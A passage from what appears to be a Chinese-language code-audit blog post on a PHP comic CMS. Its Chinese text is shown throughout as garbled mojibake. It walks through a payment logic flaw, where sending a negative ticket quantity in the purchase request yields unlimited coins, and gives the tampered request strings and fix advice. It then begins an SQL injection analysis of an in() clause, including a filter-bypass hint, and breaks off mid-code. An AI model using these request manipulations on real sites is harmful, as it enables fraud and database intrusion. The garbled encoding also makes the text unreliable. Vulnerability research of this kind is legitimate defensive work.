class="comment">/*è¿™é‡Œæœ‰ä¸ªå¾ˆæ˜æ˜¾çš„æ¼æ´å°±æ˜¯ï¼Œå¯¹æœˆç¥¨æ•°çš„é™åˆ¶åªæœ‰ä¸ä¸º0ï¼Œè€Œå¯¹äº&lt;0çš„å€¼ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥ç»•è¿‡*/</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;card&#x27;</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$card</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;å¡å¯†ä¸èƒ½ä¸ºç©º!!!&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;vip&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$day</span>, <span class="variable">$dayarr</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;Vipæ—¶é—´é”™è¯¯!!!&#x27;</span>);</span><br><span class="line">    <span class="variable">$parr</span> = <span class="keyword">array</span>(<span class="string">&#x27;cion&#x27;</span>,<span class="string">&#x27;wxpay&#x27;</span>,<span class="string">&#x27;alipay&#x27;</span>,<span class="string">&#x27;qqpay&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$pay</span>, <span class="variable">$parr</span>)) <span class="variable">$pay</span> = <span class="string">&#x27;cion&#x27;</span>;</span><br></pre></td></tr></table></figure><p>é‡‘å¸æ”¯ä»˜ä»£ç æµç¨‹åˆ†æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/api/Pay.php</span></span><br><span class="line">        <span class="comment">//é‡‘å¸æ”¯ä»˜</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pay</span> == <span class="string">&#x27;cion&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//åˆ¤æ–­é‡‘å¸æ˜¯å¦ä¸è¶³</span></span><br><span class="line">            <span class="variable">$cion</span> = <span class="variable">$rmb</span> * Pay_Rmb_Cion;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$cion</span> &gt; <span class="variable">$user</span>[<span class="string">&#x27;cion&#x27;</span>]) <span class="title function_ invoke__">get_json</span>(Pay_Cion_Name.<span class="string">&#x27;ä¸è¶³ï¼Œè¯·å…ˆå……å€¼!!!&#x27;</span>);</span><br><span class="line">            <span class="comment">/*æˆ‘ä»¬å®ç°æœˆç¥¨åå‘å……å€¼é‡‘å¸çš„å‰æç»•è¿‡å°±ç®—è¿™ä¸ªå¯¹é‡‘å¸æ•°é‡æ˜¯å¦å……è¶³çš„ç»•è¿‡</span></span><br><span class="line"><span class="comment">            $cionä¸­rmbæ˜¯é»˜è®¤å¤§äºPay_Rmb_Minè¿™ä¸ªå…¨å±€å˜é‡å€¼ä¸º1ï¼Œè€ŒPay_Rmb_Cionä¹Ÿæ˜¯é»˜è®¤ä¸º10</span></span><br><span class="line"><span class="comment">            è€Œ$user[&#x27;cion&#x27;]æ˜¯æˆ‘ä»¬è‡ªå¸¦çš„å¼€å§‹é‡‘å¸æ•°</span></span><br><span class="line"><span class="comment">            å…¶ä¸­æˆ‘ä»¬èƒ½æ§åˆ¶å¾—å‚æ•°å°±åªæœ‰rmbï¼Œä½†å…¶å®è¿˜æœ‰num</span></span><br><span class="line"><span class="comment">            å½“æˆ‘ä»¬è´­ä¹°1å¼ æœˆç¥¨æ•°æ—¶ï¼Œrmbä¸ºï¿¥1ï¼Œ</span></span><br><span class="line"><span class="comment">            ä½†å½“æˆ‘ä»¬è´­ä¹°-1å¼ æœˆç¥¨æ—¶å‘¢ï¼Œå› ä¸ºrmbä¸ºçœŸï¼Œå·²ç»é€šè¿‡äº†å…¶åˆ¤æ–­ï¼Œä½†æ˜¯å½“numè®¡ç®—æ€»é‡‘é¢æ—¶</span></span><br><span class="line"><span class="comment">            å¹¶æ²¡æœ‰å¯¹numå€¼çš„é€»è¾‘æ€§è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line"><span class="comment">            å› æ­¤</span></span><br><span class="line"><span class="comment">            ==&gt;</span></span><br><span class="line"><span class="comment">            å½“type=ticket&amp;rmb=1&amp;day=30&amp;num=10&amp;pay=cion</span></span><br><span class="line"><span class="comment">            ã€èŠ±è´¹rmb=1*10ç­‰ä»·é‡‘å¸ä¹°æœˆç¥¨ï¼Œ</span></span><br><span class="line"><span class="comment">            ä¹Ÿå°±æ˜¯èŠ±è´¹100é‡‘å¸ä¹°10å¼ æœˆç¥¨ã€‘</span></span><br><span class="line"><span class="comment">            æ”¹æˆ</span></span><br><span class="line"><span class="comment">            type=ticket&amp;rmb=1&amp;day=30&amp;num=-10&amp;pay=cion</span></span><br><span class="line"><span class="comment">            ã€èŠ±è´¹rmb=1*(-10)ç­‰ä»·æœˆç¥¨ï¼Œ</span></span><br><span class="line"><span class="comment">            ä¹Ÿå°±æ˜¯èŠ±è´¹10æœˆç¥¨ä¹°100é‡‘å¸</span></span><br><span class="line"><span class="comment">            ç›¸å½“äºèŠ±-100é‡‘å¸ï¼Œä¹°-10å¼ çš„æœˆç¥¨</span></span><br><span class="line"><span class="comment">            ï¼ˆé‡‘å¸=é‡‘å¸-(-10)ï¼›æœˆç¥¨=æœˆç¥¨+(-10)ï¼‰</span></span><br><span class="line"><span class="comment">            ã€‘</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">//è´­ä¹°æœˆç¥¨</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;ticket&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;ticket&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;ticket&#x27;</span>]+<span class="variable">$num</span>;</span><br><span class="line">                <span class="variable">$name</span> = <span class="string">&#x27;è´­ä¹°æœˆç¥¨æˆåŠŸ&#x27;</span>;</span><br><span class="line">                <span class="variable">$text</span> = <span class="string">&#x27;æ‚¨èŠ±è´¹&#x27;</span>.<span class="variable">$cion</span>.Pay_Cion_Name.<span class="string">&#x27;ï¼ŒæˆåŠŸè´­ä¹°äº†&#x27;</span>.<span class="variable">$num</span>.<span class="string">&#x27;å¼ æœˆç¥¨&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$name</span> = <span class="string">&#x27;è´­ä¹°VIPä¼šå‘˜æˆåŠŸ&#x27;</span>;</span><br><span class="line">                <span class="variable">$text</span> = <span class="string">&#x27;æ‚¨èŠ±è´¹&#x27;</span>.<span class="variable">$cion</span>.Pay_Cion_Name.<span class="string">&#x27;ï¼ŒæˆåŠŸè´­ä¹°äº†&#x27;</span>.<span class="variable">$day</span>.<span class="string">&#x27;å¤©Vipä¼šå‘˜&#x27;</span>;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;vip&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$user</span>[<span class="string">&#x27;viptime&#x27;</span>] &gt; <span class="title function_ invoke__">time</span>())&#123;</span><br><span class="line">                    <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;viptime&#x27;</span>]+<span class="number">86400</span>*<span class="variable">$day</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>*<span class="variable">$day</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//åˆ¤æ–­èµ é€å¤©æ•°</span></span><br><span class="line">                <span class="keyword">if</span>((<span class="variable">$day</span>/<span class="number">30</span>) &gt; Pay_Vip_Month)&#123;</span><br><span class="line">                <span class="variable">$sday</span> = (<span class="keyword">int</span>)((<span class="variable">$day</span>/<span class="number">30</span>) - Pay_Vip_Month);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$sday</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>]+<span class="number">86400</span>*<span class="variable">$sday</span>;</span><br><span class="line">                <span class="variable">$text</span> .= <span class="string">&#x27;ï¼Œç³»ç»Ÿèµ é€æ‚¨&#x27;</span>.<span class="variable">$sday</span>.<span class="string">&#x27;å¤©&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;    </span><br></pre></td></tr></table></figure><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>å…ˆç»™æˆ‘çš„è´¦æˆ·ä¿®æ”¹ä¸€ä¸‹é‡‘å¸æ•°</p><p><img src="/2022/11/22/CMS-Test/image-20221124135152005.png" alt="image-20221124135152005"></p><p>ç„¶åè´­ä¹°æœˆç¥¨æŠ“åŒ…çœ‹çœ‹æ•°æ®</p><p><img src="/2022/11/22/CMS-Test/image-20221124135229059.png" alt="image-20221124135229059"></p><p><img src="/2022/11/22/CMS-Test/image-20221124135257569.png" alt="image-20221124135257569"></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">type</span><span class="operator">=</span>ticket<span class="variable">&amp;rmb</span>=<span class="number">1</span><span class="variable">&amp;day</span>=<span class="number">30</span><span class="variable">&amp;num</span>=<span class="number">1</span><span class="variable">&amp;pay</span>=cion</span><br><span class="line"><span class="meta">#å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è´­ä¹°æ•°æ®å®Œå…¨æ˜¾ç¤ºå‡ºæ¥</span></span><br><span class="line"><span class="meta">#type:è´­ä¹°çš„å•†å“ç±»å‹</span></span><br><span class="line"><span class="symbol"> rmb:</span>èŠ±è´¹é‡‘é¢</span><br><span class="line"><span class="symbol"> day:</span>è´­ä¹°ç‰©å“æ—¶é™</span><br><span class="line"><span class="symbol"> num:</span>è´­ä¹°æ•°é‡</span><br><span class="line"><span class="symbol"> pay:</span>æ”¯ä»˜æ–¹å¼</span><br></pre></td></tr></table></figure><p>å…ˆè¯•è¯•ä¿®æ”¹ä¸€ä¸‹è´­ä¹°æ•°é‡</p><p>ã€é‡‘å¸<code>10000</code>ï¼Œè´­ä¹°<code>1</code>å¼ æœˆç¥¨èŠ±<code>10</code>é‡‘å¸ï¼Œåº”è¯¥è¿˜å‰©<code>9990</code>ã€‘</p><p><img src="/2022/11/22/CMS-Test/image-20221124141049742.png" alt="image-20221124141049742"></p><p>ã€é‡‘å¸<code>10000</code>ï¼Œè´­ä¹°<code>10</code>å¼ æœˆç¥¨èŠ±<code>100</code>é‡‘å¸ï¼Œåº”è¯¥è¿˜å‰©<code>9900</code>ã€‘</p><p><img src="/2022/11/22/CMS-Test/image-20221124141119999.png" alt="image-20221124141119999"></p><p>ç„¶åæˆ‘ä»¬å†çœ‹çœ‹æˆ‘ä»¬çš„å‰©ä½™é‡‘é¢</p><p><img src="/2022/11/22/CMS-Test/image-20221124141240128.png" alt="image-20221124141240128"></p><p>å‘ç°æ‰£äº†<code>200</code>é‡‘å¸ï¼ˆåº”è¯¥æ˜¯ä¸å°å¿ƒå‘äº†ä¸¤æ¬¡åŒ…ï¼‰</p><p>ã€è¿˜å‰©<code>9800</code>ã€‘</p><p>è™½ç„¶æ²¡æœ‰å®ç°æˆ‘ä»¬çš„ç›®çš„ï¼Œæ—¢ç„¶åœ¨æˆ‘ä»¬é‡‘é¢èƒ½æ‰¿å—èŒƒå›´å†…å¯ä»¥ï¼Œé‚£ä¹ˆè¯•è¯•è¶…è¿‡æˆ‘ä»¬é‡‘é¢ä»¥å¤–çš„å‘¢</p><p><img src="/2022/11/22/CMS-Test/image-20221124141731975.png" alt="image-20221124141731975"></p><p><img src="/2022/11/22/CMS-Test/image-20221124141845487.png" alt="image-20221124141845487"></p><p>å‘ç°æ˜¾ç¤ºé‡‘å¸ä¸å¤Ÿï¼Œæ—¢ç„¶æ­£å¸¸çš„æ•°æ®ä¸è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠæ•°é‡æ”¹æˆè´Ÿæ•°å‘¢</p><p><img src="/2022/11/22/CMS-Test/image-20221124141931064.png" alt="image-20221124141931064"></p><p><img src="/2022/11/22/CMS-Test/image-20221124141937935.png" alt="image-20221124141937935"></p><p>å±…ç„¶è´­ä¹°æˆåŠŸï¼Ÿ</p><p><img src="/2022/11/22/CMS-Test/image-20221124142002433.png" alt="image-20221124142002433"></p><p>æˆ‘ä»¬å‘ç°æˆ‘ä»¬çš„æœˆç¥¨æ•°å‡å°‘äº†ï¼Œä½†æ˜¯é‡‘å¸æ•°å¢åŠ äº†ï¼Œè€Œä¸”æœˆç¥¨æ•°ä¸ºè´Ÿæ•°ï¼Œæ˜æ˜¾æ˜¯æœ‰é—®é¢˜çš„</p><p>åœ¨è´­ä¹°è®°å½•ä¸­ï¼Œæˆ‘ä»¬å‘ä¸‹ç¡®å®ä¹Ÿæœ‰è®°å½•</p><p><img src="/2022/11/22/CMS-Test/image-20221124142151770.png" alt="image-20221124142151770"></p><p>è€Œè·å–é‡‘å¸çš„æ–¹å¼æœ¬æ¥åº”è¯¥æ˜¯é€šè¿‡<code>rmb</code>æ”¯ä»˜</p><p><img src="/2022/11/22/CMS-Test/image-20221124142246178.png" alt="image-20221124142246178"></p><p>ä½†æ˜¯è¿™é‡Œé€šè¿‡ç®€å•çš„ä¿®æ”¹æœˆç¥¨æ•°ä¸ºè´Ÿæ•°ï¼Œå³å¯åå‘å¢åŠ é‡‘å¸æ•°é‡ï¼Œä¸”æ²¡æœ‰ä¸Šé™åˆ¶</p><p>è¿™é‡Œæˆ‘åˆæŠŠ<code>type</code>å’Œ<code>pay</code>ä¸¤è€…äº¤æ¢</p><p><img src="/2022/11/22/CMS-Test/image-20221124142618960.png" alt="image-20221124142618960"></p><p><img src="/2022/11/22/CMS-Test/image-20221124142629873.png" alt="image-20221124142629873"></p><p>å‘ç°ä¾æ—§è´­ä¹°æˆåŠŸï¼Œè¿˜æ˜¾ç¤ºè´­ä¹°<code>10</code>é‡‘å¸ï¼Œä½†æ˜¯æœˆç¥¨æ•°å¹¶æ²¡æœ‰å˜åŒ–ï¼Œè€Œé‡‘å¸å´å‡å°‘äº†ï¼Œåº”è¯¥æ˜¯æœˆç¥¨è½¬é‡‘å¸ä¸ç¬¦åˆé€»è¾‘ï¼Œä½†æ˜¯å‘çš„è¯·æ±‚åŒ…ä¸­çš„è¯­å¥ç¬¦åˆå……å€¼è¯­å¥ï¼Œäºæ˜¯æŒ‰ç…§è¯­æ³•ï¼Œæ‰£é™¤äº†<code>num</code>æ•°é‡çš„é‡‘å¸</p><p><img src="/2022/11/22/CMS-Test/image-20221124142651295.png" alt="image-20221124142651295"></p><p>å½“æˆ‘åˆæ”¹æˆä¸”ä¿®æ”¹<code>rmb</code>æ”¹æˆ<code>1000</code></p><p><img src="/2022/11/22/CMS-Test/image-20221124150939398.png" alt="image-20221124150939398"></p><p><img src="/2022/11/22/CMS-Test/image-20221124151113186.png" alt="image-20221124151113186"></p><p>åœ¨äº¤æ˜“è®°å½•ä¸­æ˜¾ç¤ºå¢åŠ äº†<code>10000</code>é‡‘å¸ï¼Œä½†æ˜¯å®é™…é‡‘å¸æ˜¯åœ¨å‡å°‘</p><p><img src="/2022/11/22/CMS-Test/image-20221124151205737.png" alt="image-20221124151205737"></p><p>è¿™æ˜¯å› ä¸ºä¸ç¬¦åˆå……å€¼é€»è¾‘</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å±å®³</span><br><span class="line">é€šè¿‡è¯¥æ¼æ´ï¼Œå³å¯å¯¼è‡´é‡‘å¸ã€æœˆç¥¨ã€vipä¸‰è€…å¯ä»¥æ— é™åˆ¶</span><br></pre></td></tr></table></figure><h4 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¯¥æ¼æ´çš„å½¢æˆçš„æ ¹æœ¬åŸå› åœ¨äº</span><br><span class="line">åœ¨sys<span class="regexp">/apps/</span>controllers<span class="regexp">/api/</span>Pay.phpä¸­</span><br><span class="line"><span class="number">1</span>.å¯¹å®¢æˆ·ç«¯ç”¨æˆ·å¯æ§å‚æ•°çš„é™åˆ¶ä¸ç‰¢ï¼Œè€ƒè™‘ä¸å…¨ï¼Œ</span><br><span class="line"><span class="number">2</span>.å¯¹äºè´Ÿæ•°çš„æ¸…å†µï¼Œ</span><br><span class="line"><span class="number">3</span>.ä»¥åŠå¯¹ä¸åˆé€»è¾‘çš„æ”¯ä»˜æ–¹å¼çš„åˆ¤æ–­ä¸å¤Ÿ</span><br><span class="line"></span><br><span class="line">å»ºè®®</span><br><span class="line"><span class="number">1</span>.å¯¹å®¢æˆ·ç«¯å¯æ§å‚æ•°è¿›è¡ŒåŠ å¯†ï¼Œè®©ç”¨æˆ·æ— æ³•ä¿®æ”¹å…¶å€¼</span><br><span class="line"><span class="number">2</span>.å¹¶ä¸”å¯¹å‚æ•°çš„åˆç†æ€§ä»¥åŠé€»è¾‘æ€§åŠ å¼ºåˆ¤æ–­ï¼Œå®Œå–„æ•´ä½“ä»£ç é€»è¾‘ï¼ŒåŠ å¼ºä¸åŒå‚æ•°ä¹‹é—´çš„è”ç³»ï¼Œä»¥åŠå‚æ•°å˜åŒ–å‰åçš„é€»è¾‘æ€§</span><br><span class="line"><span class="number">3</span>.æœ€å¥½ä¸è¦è®©ç”¨æˆ·èƒ½å¯¹å‘é€åˆ°æœåŠ¡å™¨çš„æ•°æ®è¿›è¡Œä¿®æ”¹æˆ–æ§åˆ¶</span><br></pre></td></tr></table></figure><h3 id="2-SQLæ³¨å…¥æ¼æ´"><a href="#2-SQLæ³¨å…¥æ¼æ´" class="headerlink" title="2.SQLæ³¨å…¥æ¼æ´"></a>2.SQLæ³¨å…¥æ¼æ´</h3><h4 id="ä»£ç åˆ†æ-æ¼æ´åˆ©ç”¨"><a href="#ä»£ç åˆ†æ-æ¼æ´åˆ©ç”¨" class="headerlink" title="ä»£ç åˆ†æ+æ¼æ´åˆ©ç”¨"></a>ä»£ç åˆ†æ+æ¼æ´åˆ©ç”¨</h4><p>è¿™é‡Œåˆ©ç”¨äº†<code>Acunetix</code>å¯¹ç«™ç‚¹æ‰«æï¼Œå‘ç°äº†åœ¨ä¸»é¡µå­˜åœ¨é«˜å±çš„<code>SQL</code>æ¼æ´</p><p><img src="/2022/11/22/CMS-Test/image-20221126214707108.png" alt="image-20221126214707108"></p><p>å‘è¯·æ±‚åŒ…ï¼Œåå‘ç°å…¶å“åº”åŒ…çš„ç»“æœä¸ºæ•°æ®åº“æŠ¥é”™</p><p><img src="/2022/11/22/CMS-Test/image-20221126214959756.png" alt="image-20221126214959756"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Database Error Occurred<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              Error Number: 1064</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">     You have an error in your SQL syntax; check the manual that corresponds to     your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              select  count(*) as counta from mc_book where yid=0 and pay=0 and serialize=&#x27;è¿è½½&#x27; and cid in(1&amp;#039) order by addtime desc</span><br><span class="line">              #å‘ç°1&#x27;è¢«æ’å…¥in()ä¸­</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              Filename: D:/phpstudy_pro/WWW/127.0.0.3/sys/apps/models/Mcdb.php</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">          Line Number: 38</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>äºæ˜¯å°è¯•å†<code>in()</code>ä¸­èƒ½å¦å®ç°é—­åˆå¹¶æ‰§è¡Œæ¶æ„<code>sql</code>è¯­å¥</p><p>ä½†æ˜¯åœ¨æºç ä¸­å¯¹sqlè¯­å¥æœ‰ä¸€å®šè¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/user/Category.php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;BASEPATH&#x27;</span>) OR <span class="keyword">exit</span>(<span class="string">&#x27;No direct script access allowed&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Category</span> <span class="keyword">extends</span> <span class="title">Mccms_Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ™ºèƒ½æ£€ç´¢</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$uri</span> = <span class="variable language_">$this</span>-&gt;uri-&gt;<span class="title function_ invoke__">uri_string</span>();</span><br><span class="line">        <span class="variable">$n</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$uri</span>,<span class="string">&#x27;/index&#x27;</span>) !== <span class="literal">false</span> ? <span class="number">3</span> : <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$this</span>-&gt;uri-&gt;<span class="title function_ invoke__">uri_to_assoc</span>(<span class="variable">$n</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">category</span>(<span class="variable">$arr</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>safe_replace</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//SQLè¿‡æ»¤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line"><span class="variable">$string</span>[<span class="title function_ invoke__">safe_replace</span>(<span class="variable">$k</span>)] = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$v</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">            <span class="comment">/*%20å¯ä»¥ç”¨+ä»£æ›¿*/</span></span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#039;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_encode</span>(<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span 